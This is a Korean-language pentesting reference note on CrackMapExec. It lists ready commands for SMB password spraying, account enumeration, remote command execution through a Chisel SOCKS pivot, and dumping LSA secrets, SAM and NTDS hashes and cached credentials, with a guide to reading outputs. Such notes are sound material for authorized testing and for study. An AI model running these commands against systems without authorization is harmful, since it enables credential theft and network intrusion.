---
tags:
  - 환경/windows
  - 서비스/smb
  - 기능/인증검증
  - 기능/자격증명수집
실행환경: ["Linux"]
필요조건: ["대상 서비스", "사용자·비밀번호 또는 NTLM hash"]
결과: ["정보", "인증 결과", "명령 실행", "LSA secret·AutoLogon 평문 자격 증명과 캐시된 도메인 로그온 정보"]
---

# crackmapexec

## 도구 개요

CrackMapExec은 SMB·WinRM·LDAP 같은 서비스의 인증을 일괄 검증하고, 계정별 열거·자격 증명 수집·원격 실행 범위를 확인하는 도구다. 현재 흐름에서는 NetExec을 우선하며, 구형 환경이나 기존 `crackmapexec` 명령을 그대로 재현할 때 사용한다.

## 필요한 입력과 실행 환경

- 실행 위치: 대상 SMB, WinRM, LDAP, MSSQL 또는 SSH에 접근 가능한 Linux 호스트
- 필요한 입력: 대상 호스트/대역, 프로토콜, 도메인·사용자·비밀번호 또는 NTLM hash
- spraying 입력: 사용자·비밀번호 목록과 사전에 확인한 계정 잠금 정책
- 기본 선택은 [[netexec]]이며, 이 문서는 CrackMapExec 문법을 그대로 재현해야 할 때만 사용한다.

## 표준 사용법

```bash
crackmapexec <protocol> <target> -u <user_or_list> -p <password_or_list>
```

## 대표 예시

### SMB password spraying

```bash
crackmapexec smb <TARGET> -u users.txt -p '<PASSWORD>' --local-auth
```

### SMB share 권한 확인

```bash
crackmapexec smb <TARGET> --shares -u '' -p ''
```

### 사용자·그룹·비밀번호 정책 열거

```bash
crackmapexec smb <DC> -u '<USER>' -p '<PASSWORD>' --users
crackmapexec smb <DC> -u '<USER>' -p '<PASSWORD>' --groups
crackmapexec smb <DC> -u '<USER>' -p '<PASSWORD>' --pass-pol
```

익명 세션이 허용되는 환경에서는 빈 credential로 정책 조회가 되는지 먼저 확인한다. 실제 spraying 횟수와 대기 시간은 출력된 잠금 임계값과 잠금 지속 시간을 기준으로 정한다.

### 로그온 사용자와 공유 파일 후보 확인

```bash
crackmapexec smb <TARGET> -u '<USER>' -p '<PASSWORD>' --loggedon-users
crackmapexec smb <TARGET> -u '<USER>' -p '<PASSWORD>' -M spider_plus
```

### WinRM 로그인 가능성 확인

```bash
crackmapexec winrm <TARGET> -u username.list -p password.list
```

### SMB 관리자급 원격 명령 확인

```bash
crackmapexec smb <TARGET> -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' -x 'whoami'
```

SOCKS 피벗 뒤의 내부 대상이면 동작 중인 ProxyChains 설정과 함께 실행한다.

```bash
proxychains -q crackmapexec smb <INTERNAL_TARGET> -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' -x 'whoami'
```

`Pwn3d!`만으로 실행 성공을 확정하지 않는다. `Executed command`와 원격 `whoami` 출력이 반환되어야 대상에서 실제 명령이 실행된 것이다.

### Chisel SOCKS 경유 LSA 정보 수집

Chisel reverse SOCKS가 `127.0.0.1:1083`에 열려 있고, 해당 내부 대상에서 `Pwn3d!` 또는 원격 명령 실행으로 관리자급 원격 작업 권한을 확인했을 때 실행한다.

```bash
proxychains -f ./chisel-socks.conf crackmapexec smb <INTERNAL_TARGET> -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' --lsa
```

`Dumping LSA Secrets`, 서비스 계정 secret, `DPAPI_SYSTEM`과 `<DOMAIN>\<USER>:<PLAINTEXT_PASSWORD>` 형식은 [[Windows LSA Secrets 추출]]로, cached domain logon 또는 `$DCC2$` 출력은 [[Windows Cached Domain Credentials 추출]]로 넘긴다. 평문 AD 계정을 얻었으면 [[AD 계정의 디렉터리 복제 권한 확인]]을 포함해 그 계정의 실제 권한을 확인한다. SMB `[+]`만 출력된 일반 사용자 인증 상태에서는 `--lsa` 성공을 기대하지 않는다.

### 로컬 관리자 계정으로 LSA 정보 수집

```bash
crackmapexec smb <TARGET> --local-auth -u <LOCAL_ADMIN> -p '<PASSWORD>' --lsa
```

`--local-auth`는 대상 호스트의 로컬 SAM 계정으로 인증한다. 도메인 계정이면 `-d <DOMAIN>`을 사용하고 두 범위를 섞지 않는다.

## 주요 옵션

| 옵션 | 설명 |
| --- | --- |
| `smb`, `winrm`, `ldap`, `mssql`, `ssh` | 사용할 프로토콜 선택 |
| `-u`, `-p` | 사용자/비밀번호 또는 목록 파일 지정 |
| `-H` | NTLM hash로 인증 |
| `--local-auth` | 도메인이 아닌 로컬 계정으로 인증 |
| `--shares` | SMB share 열거 |
| `--users`, `--groups` | SMB/RPC에서 조회 가능한 도메인 사용자와 그룹 열거 |
| `--pass-pol` | 비밀번호와 계정 잠금 정책 열거 |
| `--loggedon-users` | 대상의 로그온 사용자 열거 |
| `-M spider_plus` | 접근 가능한 공유의 파일 후보를 재귀적으로 색인 |
| `-M gpp_password` | SYSVOL의 GPP `cpassword` 탐색·복호화 | GPP credential 후보 수집 |
| `-M gpp_autologin` | SYSVOL `Registry.xml`의 autologon 정보 탐색 | 자동 로그인 credential 후보 수집 |
| `--sam`, `--lsa`, `--ntds` | 필요한 로컬 관리자·복제 권한이 있을 때 로컬 계정 NTLM hash·LSA secret 또는 도메인 계정 NTLM hash·Kerberos key 덤프 |
| `-x`, `-X` | 원격 명령 실행(cmd/PowerShell) |

## 도구 고유 출력

| 출력/상태 | 의미 | 다음 행동 |
|---|---|---|
| `Pwn3d!` 또는 관리자 표시 | 해당 프로토콜에서 관리자급 원격 작업 가능 | dump, exec, share 접근, lateral movement 가능성 확인 |
| `STATUS_LOGON_FAILURE` | credential 불일치 | 도메인/로컬 계정 형식과 비밀번호 재확인 |
| `STATUS_ACCOUNT_LOCKED_OUT` / lockout | 계정 잠금 발생 또는 위험 | 즉시 시도 중단, spraying 간격과 대상 사용자 수 재조정 |
| 인증은 성공하지만 권한 부족 | 일반 사용자 권한만 있음 | share/LDAP/WinRM 등 접근 가능한 범위 열거 |
| `Dumping LSA Secrets`와 secret 출력 | 대상의 SECURITY·SYSTEM 기반 LSA 정보 추출 성공 | secret 유형과 연결 계정을 구분하고 현재 유효성을 별도 검증 |
| `<DOMAIN>\<USER>:<PLAINTEXT_PASSWORD>` | AutoLogon 등 계정명이 연결된 평문 secret 출력 | AD 계정 컨텍스트와 객체·복제 권한 확인 |
| `<HOST>$:plain_password_hex:<HEX>` | 컴퓨터 계정 secret의 16진수 표현 | 사용자 평문 비밀번호와 분리하여 머신 계정 후속 경로 판단 |
| `$DCC2$...` | 캐시된 도메인 로그온 hash 출력 | [[Windows Cached Domain Credentials 추출]]에서 오프라인 검증 |
| `--lsa` 실행 중 access denied | 인증은 성공했지만 대상의 관리자급 원격 작업 또는 hive 접근 권한 부족 | `Pwn3d!`, 원격 명령 실행과 대상 보안 설정 재확인 |
| SMB 연결 실패 | 포트 차단, SMB signing, 방화벽 | SMB/WinRM/LDAP 등 다른 프로토콜과 포트 상태 확인 |

## 실전 진입

- 현재 지원되는 흐름은 `nxc` 명령을 사용하는 [[netexec]]를 우선 사용하고, [[원격 비밀번호 공격]]에서 인증 성공과 lockout 위험을 함께 판단한다.
- 기존 CrackMapExec 명령만 남아 있는 경우 이 문서로 문법을 재현한 뒤 [[SMB 익명 열거와 공유 권한 확인]], [[WinRM 원격 PowerShell 세션]], [[Pass the Hash]]로 진행한다.

## 관련 공격기법

- [[AD 비밀번호 정책 열거 및 조회]]
- [[인증 전 AD 사용자 목록 수집]]
- [[내부 AD Password Spraying]]
- [[인증 후 AD 사용자와 컴퓨터 객체 열거]]
- [[AD 고권한 그룹과 중첩 구성원 열거]]
- [[원격 Windows 로그온 사용자와 로컬 관리자 단서 열거]]
- [[SYSVOL GPP 자격 증명 수집]]
- [[WMI 원격 명령 실행]]
- [[Windows LSA Secrets 추출]]
- [[Windows Cached Domain Credentials 추출]]
- [[AD 계정의 디렉터리 복제 권한 확인]]
- [[Chisel SOCKS 터널링]]
